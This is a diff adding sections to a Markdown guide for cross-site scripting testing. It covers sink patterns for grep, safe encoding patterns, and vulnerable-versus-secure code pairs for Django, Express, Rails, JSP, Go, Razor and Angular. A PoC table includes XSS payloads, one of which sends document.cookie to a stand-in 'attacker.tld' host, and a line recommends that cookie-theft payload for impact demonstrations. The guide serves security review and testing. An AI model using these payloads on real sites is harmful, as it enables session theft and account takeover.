@@ -7,6 +7,23 @@ description: XSS testing covering reflected, stored, and DOM-based vectors with 
 
 Cross-site scripting persists because context boundaries, parser behavior, and framework-specific edges combine in non-obvious ways. Every user-influenced string must be treated as untrusted until it has been strictly encoded for the exact sink it reaches, and guarded by a runtime policy such as CSP or Trusted Types.
 
+## Class Boundaries
+
+**What XSS IS** — unescaped, unsanitized user input reaching an HTML/JS/DOM output sink:
+
+- **Server-side HTML sinks**: `{{ var | safe }}`, `mark_safe(var)`, `Markup(var)`, `<%- var %>` (EJS), `{{{ var }}}` (Handlebars), `!{var}` (Pug), `th:utext`, `[(${var})]` (Thymeleaf), `{!! $var !!}` (Blade), `raw(var)` / `.html_safe` (Rails), `echo $var` without `htmlspecialchars()`, `@Html.Raw(var)`, `template.HTML(var)` (Go bypass), `render_template_string(f"...{var}...")`, `res.send("<p>" + var + "</p>")`
+- **Client DOM sinks**: `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`, jQuery `.html()`/`.append()`, `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{@html}`, `bypassSecurityTrustHtml(var)`
+- **JS execution sinks**: `eval(var)`, `setTimeout(var, …)` / `setInterval(var, …)` with string args, `new Function(var)()`, `scriptElement.text = var`, event-handler attributes (`onclick`, `href="javascript:…"`), `location.href = var` when scheme is attacker-controlled
+
+**What XSS is NOT** (commonly confused with):
+
+- **CSRF** — forged requests on behalf of a user; separate class
+- **Clickjacking** — iframe overlay attacks; separate class
+- **HTTP response splitting** — newline injection into response headers; separate class
+- **SQLi via XSS** — the SQL injection is the primary finding; XSS is a delivery vector
+- **Auto-escaped template output** — `{{ var }}` (Jinja2/Django/Twig/Handlebars with escaping on), `<%= var %>` (EJS), `@var` (Razor), `th:text` (Thymeleaf)
+- **`textContent` / `innerText`** — plain text only; no HTML parsing
+
 ## Where to Look
 
 **Types**
@@ -41,6 +58,27 @@ Cross-site scripting persists because context boundaries, parser behavior, and f
 
 **File/Metadata**
 - Image/SVG/XML filenames and EXIF fields, office documents processed server-side or client-side
+
+### Recon Indicators (grep-able sink patterns)
+
+Flag any dynamic variable passed to these sinks; taint tracing confirms exploitability.
+
+**Server-side unescaped output**
+- Jinja2/Django: `\| safe`, `{% autoescape off %}`, `Markup(`, `mark_safe(`, `format_html(` with user args
+- EJS: `<%- `; Handlebars: `{{{`; Pug: `!{`; Twig: `\| raw`; Blade: `{!!`; Thymeleaf: `th:utext`, `[($`
+- Rails: `raw(`, `.html_safe`, `<%= raw`; PHP: `echo $`, `print $`, `<?=` without `htmlspecialchars`
+- Go: `template.HTML(`, `template.JS(`, `text/template` for HTML; C#: `@Html.Raw(`, `MvcHtmlString.Create(`
+- String-built HTML: `res.send("<`, `f"<.*{var}`, `render_template_string(f`
+
+**Client DOM / JS sinks**
+- `.innerHTML\s*=`, `.outerHTML\s*=`, `insertAdjacentHTML(`, `document\.write(`
+- jQuery: `\.html\(`, `\.append\(`, `\$\('<.*' \+`
+- React: `dangerouslySetInnerHTML`; Vue: `v-html`; Angular: `\[innerHTML\]`, `bypassSecurityTrust`
+- `eval\(`, `new Function\(`, `setTimeout\(\s*\w+`, `setInterval\(\s*\w+` (string arg, not function ref)
+- URL sinks: `location\.(href|replace|assign)\s*=`, `.setAttribute\(['"]href`, `.src\s*=`, `.action\s*=`
+
+**DOM-based sources** (pair with any sink above)
+- `location\.(search|hash|href)`, `document\.(referrer|URL|cookie)`, `window\.name`, `postMessage` / `event\.data`, `URLSearchParams`, `localStorage` / `sessionStorage`
 
 ## Context Encoding Rules
 
@@ -195,6 +233,65 @@ Maintain a compact, context-tuned set:
 3. Show that stated defenses are bypassed — sanitizer settings, CSP headers, Trusted Types — with concrete proof
 4. Quantify impact beyond proof-of-concept: data accessed, action performed, persistence achieved
 
+**Dynamic test / PoC signals**
+
+| XSS type | Payload | Expected signal |
+|----------|---------|-----------------|
+| Reflected (HTML body) | `?q=<img src=x onerror=alert(1)>` or `<script>alert(1)</script>` | Unescaped markup/script in response body; alert or DOM node injection |
+| Stored | Submit `<img src=x onerror=fetch('//attacker.tld?c='+document.cookie)>` via profile/comment field; reload as victim | Payload persists and executes for other users |
+| DOM-based (hash) | Visit `/#<img src=x onerror=alert(1)>` | Script runs client-side with no server echo; check `location.hash` → sink trace |
+| Attribute context | `" autofocus onfocus=alert(1) x="` | Breaks out of quoted attribute; event fires on focus |
+| `javascript:` URL | `javascript:alert(1)` in href/src/action param | Navigation or iframe load executes JS |
+
+Use `fetch('//attacker.tld/log?'+document.cookie)` instead of `alert()` for impact PoCs. Capture response Content-Type — HTML sinks require `text/html`; JSON responses are not XSS unless a client parses and injects them.
+
+## Safe Patterns
+
+When these appear immediately before or at the sink, downgrade or exclude:
+
+**Auto-escaping (engine defaults on)**
+```jinja2
+{{ var }}          {# Jinja2/Django — HTML-escaped #}
+```
+```html
+<%= var %>         <!-- EJS escaped -->
+{{ var }}          <!-- Handlebars double-brace -->
+= var              <!-- Pug escaped -->
+th:text="${var}"   <!-- Thymeleaf -->
+@var               <!-- Razor -->
+```
+
+**Explicit escaping**
+```php
+echo htmlspecialchars($var, ENT_QUOTES, 'UTF-8');
+```
+```ruby
+<%= h(var) %>
+```
+```jsp
+<c:out value="${var}"/>
+```
+
+**Safe DOM writes**
+```javascript
+element.textContent = userInput;   // no HTML parsing
+element.innerText = userInput;
+```
+
+**Allowlist sanitization**
+```javascript
+element.innerHTML = DOMPurify.sanitize(userInput);
+const clean = sanitizeHtml(userInput, { allowedTags: [], allowedAttributes: {} });
+```
+
+**Framework text interpolation (not raw HTML sinks)**
+```jsx
+return <div>{userInput}</div>;     // React auto-escaped
+```
+```html
+<div>{{ userInput }}</div>         <!-- Angular/Vue interpolation -->
+```
+
 ## Common False Alarms
 
 - Reflected content that is correctly encoded for the exact context it appears in
@@ -281,6 +378,97 @@ Auto-escaping protects HTML *text/attribute* context but NOT a URL that is later
 - **VULN**: `print $userInput` — no escaping
 - **SAFE**: `echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8')`
 - **SAFE**: `echo htmlentities($userInput, ENT_QUOTES, 'UTF-8')` — ENT_QUOTES required for attribute contexts (default ENT_COMPAT leaves single quotes unencoded)
+
+## Vulnerable vs Secure Examples
+
+Framework pairs not covered above. Match stack before citing.
+
+### Python — Django
+
+```python
+# VULN: mark_safe() bypasses auto-escaping
+safe_bio = mark_safe(request.GET.get('bio', ''))
+
+# SECURE: pass raw string; template {{ bio }} auto-escapes
+return render(request, 'bio.html', {'bio': request.GET.get('bio', '')})
+```
+
+### Node.js — Express (string concat)
+
+```javascript
+// VULN: user input in HTML response
+res.send(`<h1>Results for: ${req.query.q}</h1>`);
+
+// SECURE: escape manually or use auto-escaping template
+const escapeHtml = require('escape-html');
+res.send(`<h1>Results for: ${escapeHtml(req.query.q)}</h1>`);
+```
+
+### EJS / Handlebars
+
+```html
+<!-- VULN -->
+<div><%- userInput %></div>
+<div>{{{ userInput }}}</div>
+
+<!-- SECURE -->
+<div><%= userInput %></div>
+<div>{{ userInput }}</div>
+```
+
+### Ruby on Rails
+
+```erb
+<%# VULN %>
+<%= raw(@user.bio) %>
+<%= @user.bio.html_safe %>
+
+<%# SECURE %>
+<%= @user.bio %>
+```
+
+### Java — JSP
+
+```jsp
+<%-- VULN --%>
+<p>Hello, <%= request.getParameter("name") %></p>
+<p>Hello, ${param.name}</p>
+
+<%-- SECURE --%>
+<p>Hello, <c:out value="${param.name}"/></p>
+```
+
+### Go — html/template
+
+```go
+// VULN: text/template or template.HTML() cast bypasses escaping
+import "text/template"
+name := template.HTML(r.URL.Query().Get("name"))
+
+// SECURE: html/template with plain string — auto-escaped
+import "html/template"
+tmpl.Execute(w, struct{ Name string }{Name: r.URL.Query().Get("name")})
+```
+
+### C# — Razor
+
+```csharp
+// VULN
+@Html.Raw(userInput)
+
+// SECURE
+@userInput
+```
+
+### Angular — DomSanitizer bypass
+
+```typescript
+// VULN: bypass with user-controlled input
+this.sanitizer.bypassSecurityTrustHtml(userInput);
+
+// SECURE: interpolation auto-escapes
+// template: <div>{{ userInput }}</div>
+```
 
 ## Java Servlet Patterns (CWE-79)
 
